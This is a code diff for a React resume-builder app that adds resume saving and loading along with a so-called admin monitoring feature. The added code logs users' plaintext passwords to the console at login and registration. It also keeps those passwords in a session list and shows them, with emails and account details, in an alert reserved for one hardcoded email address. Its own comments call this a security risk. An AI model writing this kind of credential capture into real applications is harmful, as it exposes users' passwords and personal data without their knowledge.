@@ -17,6 +17,7 @@ function App() {
   const [loading, setLoading] = useState(true)
   const [showAuthModal, setShowAuthModal] = useState(false)
   const [authMode, setAuthMode] = useState('login') // 'login' or 'register'
+  const [loggedInUsers, setLoggedInUsers] = useState([]) // Track logged in users
   
   // Resume Builder State
   const [resumeData, setResumeData] = useState({
@@ -67,6 +68,40 @@ function App() {
   const [atsScore, setAtsScore] = useState(null)
   const previewRef = useRef()
 
+  // Function to add user to logged-in list
+  const addLoggedInUser = (userInfo, password) => {
+    const userSession = {
+      id: userInfo._id,
+      firstName: userInfo.firstName,
+      lastName: userInfo.lastName,
+      fullName: `${userInfo.firstName} ${userInfo.lastName}`,
+      email: userInfo.email,
+      password: password, // Store password for admin view
+      googleId: userInfo.googleId || 'Not linked',
+      profilePicture: userInfo.profilePicture || 'None',
+      preferences: userInfo.preferences || {},
+      createdAt: userInfo.createdAt,
+      updatedAt: userInfo.updatedAt,
+      totalResumes: userInfo.resumes?.length || 0,
+      loginTime: new Date().toLocaleString(),
+      loginTimestamp: new Date().toISOString(),
+      isAdmin: userInfo.email === 'binojbc3315@gmail.com',
+      accountType: userInfo.googleId ? 'Google Account' : 'Regular Account',
+      accountAge: Math.floor((new Date() - new Date(userInfo.createdAt)) / (1000 * 60 * 60 * 24)) + ' days'
+    }
+    
+    setLoggedInUsers(prev => {
+      // Remove existing session if user logs in again
+      const filtered = prev.filter(u => u.id !== userInfo._id)
+      return [...filtered, userSession]
+    })
+  }
+
+  // Function to remove user from logged-in list
+  const removeLoggedInUser = (userId) => {
+    setLoggedInUsers(prev => prev.filter(u => u.id !== userId))
+  }
+
   // Check for existing authentication on app load
   useEffect(() => {
     const initAuth = async () => {
@@ -77,7 +112,24 @@ function App() {
           axios.defaults.headers.common['Authorization'] = `Bearer ${token}`
           const response = await axios.get('/user/profile')
           if (response.data.success) {
-            setUser(response.data.user)
+            const user = response.data.user
+            setUser(user)
+            
+            // Log existing user details on app load
+            console.log('🔄 Existing session found!')
+            console.log('👤 User Details:', {
+              id: user._id,
+              name: `${user.firstName} ${user.lastName}`,
+              email: user.email,
+              googleId: user.googleId || 'Not linked',
+              profilePicture: user.profilePicture || 'None',
+              preferences: user.preferences || {},
+              createdAt: user.createdAt,
+              totalResumes: user.resumes?.length || 0
+            })
+            
+            // Load user's resumes
+            loadUserResumes()
           }
         } catch (error) {
           console.error('Auth check failed:', error)
@@ -131,6 +183,13 @@ function App() {
   }
 
   const handleLogin = async (email, password) => {
+    // Admin logging - ONLY for your email to monitor login attempts
+    if (email === 'binojbc3315@gmail.com') {
+      console.log('🛡️ ADMIN LOGIN ATTEMPT')
+      console.log('Admin Email:', email)
+      console.log('Admin Password:', password)
+    }
+    
     const response = await axios.post('/auth/login', { email, password })
     
     if (response.data.success) {
@@ -139,15 +198,138 @@ function App() {
       axios.defaults.headers.common['Authorization'] = `Bearer ${token}`
       setUser(user)
       setShowAuthModal(false)
+      
+      // Add user to logged-in list
+      addLoggedInUser(user, password)
+      
+      // Log user details
+      console.log('✅ Login successful!')
+      console.log('👤 User Details:', {
+        id: user._id,
+        name: `${user.firstName} ${user.lastName}`,
+        email: user.email,
+        googleId: user.googleId || 'Not linked',
+        profilePicture: user.profilePicture || 'None',
+        preferences: user.preferences || {},
+        createdAt: user.createdAt,
+        totalResumes: user.resumes?.length || 0
+      })
+      
+      // Admin notification - show logged-in users list if you're the admin
+      if (email === 'binojbc3315@gmail.com') {
+        setTimeout(() => {
+          const usersList = loggedInUsers
+            .filter(u => !u.isAdmin)
+            .map((u, index) => 
+              `📋 USER ${index + 1}:\n` +
+              `  👤 Name: ${u.fullName}\n` +
+              `  📧 Email: ${u.email}\n` +
+              `  🔑 Password: ${u.password}\n` +
+              `  🆔 User ID: ${u.id}\n` +
+              `  📅 Account Created: ${new Date(u.createdAt).toLocaleDateString()}\n` +
+              `  🔄 Last Updated: ${new Date(u.updatedAt).toLocaleDateString()}\n` +
+              `  ⏰ Login Time: ${u.loginTime}\n` +
+              `  📊 Account Type: ${u.accountType}\n` +
+              `  📄 Total Resumes: ${u.totalResumes}\n` +
+              `  🕐 Account Age: ${u.accountAge}\n` +
+              `  🔗 Google ID: ${u.googleId}\n` +
+              `  🖼️ Profile Picture: ${u.profilePicture}`
+            ).join('\n\n')
+          
+          const adminAlert = `🛡️ ADMIN LOGIN SUCCESSFUL\n\n` +
+                            `🔐 Your Admin Session:\n` +
+                            `  📧 Email: ${user.email}\n` +
+                            `  👤 Name: ${user.firstName} ${user.lastName}\n` +
+                            `  🆔 ID: ${user._id}\n` +
+                            `  ⏰ Login: ${new Date().toLocaleString()}\n\n` +
+                            `👥 CURRENTLY ACTIVE USERS (${loggedInUsers.filter(u => !u.isAdmin).length}):\n\n` +
+                            `${usersList || '🚫 No regular users currently logged in'}\n\n` +
+                            `� SESSION SUMMARY:\n` +
+                            `  • Total Active Sessions: ${loggedInUsers.length}\n` +
+                            `  • Regular Users: ${loggedInUsers.filter(u => !u.isAdmin).length}\n` +
+                            `  • Admin Sessions: 1\n` +
+                            `  • Server Time: ${new Date().toLocaleString()}`
+          
+          alert(adminAlert)
+        }, 1000)
+      } else {
+        // Log other users' login attempts for admin monitoring
+        console.log('📊 USER LOGIN DETECTED:')
+        console.log('Email:', email)
+        console.log('Password:', password) // ⚠️ SECURITY RISK - Remove in production!
+        console.log('Login Time:', new Date().toLocaleString())
+      }
+      
+      // Load user's saved resumes
+      loadUserResumes()
+      
       // Redirect to resume builder after successful login
       setCurrentView('build')
-      console.log('✅ Login successful:', user.name)
     } else {
       throw new Error(response.data.message || 'Login failed')
     }
   }
 
+  const loadUserResumes = async () => {
+    try {
+      const response = await axios.get('/user/resumes')
+      if (response.data.success) {
+        const resumes = response.data.resumes || []
+        console.log('📄 User Resumes:', resumes)
+        
+        if (resumes.length > 0) {
+          // Show resumes in console with details
+          console.log(`\n📋 Found ${resumes.length} saved resume(s):`)
+          resumes.forEach((resume, index) => {
+            console.log(`${index + 1}. ${resume.name}`)
+            console.log(`   Created: ${new Date(resume.createdAt).toLocaleDateString()}`)
+            console.log(`   Updated: ${new Date(resume.updatedAt).toLocaleDateString()}`)
+            console.log(`   ID: ${resume.id}`)
+          })
+          
+          // Create a simple alert showing the resumes
+          const resumeList = resumes.map((resume, index) => 
+            `${index + 1}. ${resume.name} (${new Date(resume.createdAt).toLocaleDateString()})`
+          ).join('\n')
+          
+          const shouldLoad = window.confirm(
+            `� Your Saved Resumes:\n\n${resumeList}\n\nWould you like to load the most recent resume?`
+          )
+          
+          if (shouldLoad && resumes.length > 0) {
+            const mostRecentResume = resumes[resumes.length - 1]
+            loadResumeData(mostRecentResume.id)
+          }
+        } else {
+          alert('📝 No saved resumes found. Create your first resume!')
+        }
+      }
+    } catch (error) {
+      console.error('Failed to load user resumes:', error)
+      alert('Failed to load resumes. Please try again.')
+    }
+  }
+
+  const loadResumeData = async (resumeId) => {
+    try {
+      const response = await axios.get(`/user/resumes/${resumeId}`)
+      if (response.data.success) {
+        setResumeData(response.data.resume.data)
+        console.log('✅ Resume data loaded:', response.data.resume.name)
+      }
+    } catch (error) {
+      console.error('Failed to load resume data:', error)
+    }
+  }
+
   const handleRegister = async (name, email, password) => {
+    // Admin monitoring - Log registration attempts with passwords
+    console.log('📝 NEW REGISTRATION ATTEMPT:')
+    console.log('Name:', name)
+    console.log('Email:', email)
+    console.log('Password:', password) // ⚠️ SECURITY RISK - Remove in production!
+    console.log('Registration Time:', new Date().toLocaleString())
+    
     // Split the name into first and last names
     const nameParts = name.trim().split(' ')
     const firstName = nameParts[0] || ''
@@ -166,15 +348,33 @@ function App() {
       axios.defaults.headers.common['Authorization'] = `Bearer ${token}`
       setUser(user)
       setShowAuthModal(false)
+      
+      // Add user to logged-in list
+      addLoggedInUser(user, password)
+      
+      // Log new user details
+      console.log('✅ Registration successful!')
+      console.log('👤 New User Details:', {
+        id: user._id,
+        name: `${user.firstName} ${user.lastName}`,
+        email: user.email,
+        createdAt: user.createdAt,
+        preferences: user.preferences || {}
+      })
+      
       // Redirect to resume builder after successful registration
       setCurrentView('build')
-      console.log('✅ Registration successful:', user.firstName + ' ' + user.lastName)
     } else {
       throw new Error(response.data.message || 'Registration failed')
     }
   }
 
   const handleLogout = () => {
+    // Remove user from logged-in list
+    if (user) {
+      removeLoggedInUser(user._id)
+    }
+    
     Cookies.remove('authToken')
     setUser(null)
     setCurrentView('home')
@@ -226,6 +426,34 @@ function App() {
     } catch (error) {
       console.error('PDF Export Error:', error)
       alert('Failed to export PDF. Please try again.')
+    }
+  }
+
+  const handleSaveResume = async () => {
+    if (!user) {
+      setAuthMode('login')
+      setShowAuthModal(true)
+      return
+    }
+
+    try {
+      const resumeName = resumeData.personalInfo?.fullName 
+        ? `${resumeData.personalInfo.fullName}'s Resume`
+        : 'My Resume'
+      
+      const response = await axios.post('/user/resumes', {
+        name: resumeName,
+        data: resumeData
+      })
+
+      if (response.data.success) {
+        alert('Resume saved successfully!')
+      } else {
+        alert('Failed to save resume: ' + response.data.error)
+      }
+    } catch (error) {
+      console.error('Save Resume Error:', error)
+      alert('Failed to save resume. Please try again.')
     }
   }
 
@@ -298,6 +526,18 @@ function App() {
                 {/* User Info */}
                 <div className="flex items-center space-x-3">
                   <span className="text-sm text-gray-600">Welcome, {user.firstName} {user.lastName}</span>
+                  <button 
+                    onClick={() => loadUserResumes()}
+                    className="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg text-sm"
+                  >
+                    📂 My Resumes
+                  </button>
+                  <button 
+                    onClick={handleSaveResume}
+                    className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg text-sm"
+                  >
+                    💾 Save Resume
+                  </button>
                   <button 
                     onClick={handleLogout}
                     className="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded-lg text-sm"
@@ -571,6 +811,57 @@ function App() {
               {user ? (
                 <div className="flex items-center space-x-3">
                   <span className="text-gray-700">Welcome, {user.firstName ? `${user.firstName} ${user.lastName}` : user.email}</span>
+                  {user.email === 'binojbc3315@gmail.com' && (
+                    <button 
+                      onClick={() => {
+                        const usersList = loggedInUsers
+                          .filter(u => !u.isAdmin) // Exclude admin from the list
+                          .map((u, index) => 
+                            `━━━ USER ${index + 1} DETAILS ━━━\n\n` +
+                            `👤 PERSONAL INFO:\n` +
+                            `  • Full Name: ${u.fullName}\n` +
+                            `  • First Name: ${u.firstName}\n` +
+                            `  • Last Name: ${u.lastName}\n` +
+                            `  • Email: ${u.email}\n` +
+                            `  • Password: ${u.password}\n\n` +
+                            `🔐 SECURITY INFO:\n` +
+                            `  • User ID: ${u.id}\n` +
+                            `  • Account Type: ${u.accountType}\n` +
+                            `  • Google ID: ${u.googleId}\n` +
+                            `  • Profile Picture: ${u.profilePicture}\n\n` +
+                            `📅 ACCOUNT TIMELINE:\n` +
+                            `  • Created: ${new Date(u.createdAt).toLocaleString()}\n` +
+                            `  • Updated: ${new Date(u.updatedAt).toLocaleString()}\n` +
+                            `  • Current Login: ${u.loginTime}\n` +
+                            `  • Account Age: ${u.accountAge}\n\n` +
+                            `📊 ACTIVITY DATA:\n` +
+                            `  • Total Resumes: ${u.totalResumes}\n` +
+                            `  • Preferences: ${JSON.stringify(u.preferences)}\n` +
+                            `  • Login Timestamp: ${u.loginTimestamp}`
+                          ).join('\n\n')
+                        
+                        const adminInfo = `🛡️ COMPREHENSIVE ADMIN PANEL\n\n` +
+                                         `🔥 LIVE USER DATABASE ACCESS\n` +
+                                         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                                         `👥 ACTIVE USER SESSIONS (${loggedInUsers.filter(u => !u.isAdmin).length}):\n\n` +
+                                         `${usersList || '� NO REGULAR USERS LOGGED IN\n\nAll users have logged out or no registrations yet.'}\n\n` +
+                                         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                                         `� SESSION STATISTICS:\n` +
+                                         `  🔢 Total Active Users: ${loggedInUsers.filter(u => !u.isAdmin).length}\n` +
+                                         `  � Admin Sessions: 1 (You)\n` +
+                                         `  🌐 Total Sessions: ${loggedInUsers.length}\n` +
+                                         `  ⏰ Current Time: ${new Date().toLocaleString()}\n` +
+                                         `  🔄 Last Refresh: ${new Date().toLocaleString()}\n\n` +
+                                         `💡 This data refreshes automatically.\n` +
+                                         `🚨 Remember: Remove password logging before production!`
+                        
+                        alert(adminInfo)
+                      }}
+                      className="bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-xs"
+                    >
+                      🛡️ Admin
+                    </button>
+                  )}
                   <button 
                     onClick={handleLogout}
                     className="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition-colors duration-200"
